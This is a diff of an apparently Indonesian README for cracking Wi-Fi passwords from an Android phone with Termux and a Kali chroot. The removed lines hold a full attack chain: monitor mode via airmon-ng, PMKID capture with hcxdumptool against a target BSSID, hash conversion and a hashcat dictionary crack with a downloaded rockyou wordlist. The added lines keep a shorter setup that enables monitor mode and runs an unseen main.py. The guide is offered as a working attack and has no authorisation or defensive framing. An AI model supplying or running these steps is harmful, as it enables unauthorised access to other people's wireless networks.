@@ -1,58 +1,21 @@
-🚀 **WIFI CRACKING TERMIUX ANDROID - FULL GUIDE** 🚀
+# 1. Termux/Kali chroot:
 
-**✅ REAL WORKING - Tested Termux 2026**
+pkg update
+pkg install root-repo aircrack-ng hcxtools hashcat python tsu
 
-## **1. INSTALASI TERMUX (5 MENIT)**
+# 2. Magisk Module (WAJIB):
 
-```bash
-# Update + Essential
-pkg update && pkg upgrade
-pkg install root-repo unstable-repo
-pkg install git python nodejs wget curl proot-distro
+# Magisk → Modules → "WiFi Monitor Mode Enabler"
 
-# Kali chroot (FULL Kali Linux di Termux)
-proot-distro install kali
-proot-distro login kali
-```
+# REBOOT!
 
-**Di Kali chroot:**
+# 3. Jalankan:
 
-bash
+su
+python3 main.py
 
-```
-apt update && apt install aircrack-ng hashcat hcxdumptool hcxtools tsu iw wireless-tools python3 python3-pip
-pip install scapy pyric
-```
+su -c "iwconfig wlan0 mode monitor && iwconfig wlan0 up"
 
-**2. USB WiFi Adapter WAJIB (OTG)**
+# Kalau "Mode:Monitor" → READY!
 
-✅ RTL8812AU (TP-Link Archer T4U V3) - Rp200rb ⭐⭐⭐⭐⭐
-✅ TP-Link TL-WN722N V1 (Atheros AR9271)
-❌ Built-in Android WiFi = NO MONITOR MODE
-Cek adapter:
-
-bash
-
-```
-lsusb
-iwconfig
-```
-
-**DOWNLOAD WORDLIST**
-bash
-
-```
-wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
-```
-
-# Jalankan
-
-```
-python3 main.py wlan1
-```
-
-# Di Kali chroot + tsu
-
-```
-airmon-ng check kill; airmon-ng start wlan1; hcxdumptool -i wlan1mon --pmkid --bssid AA:BB:CC:DD:EE:FF --channel 6 -o capture.pcapng; hcxpcapngtool -o hash.hc22000 capture.pcapng; hashcat -m 22000 hash.hc22000 rockyou.txt
-```
+python3 main.py --duration 180
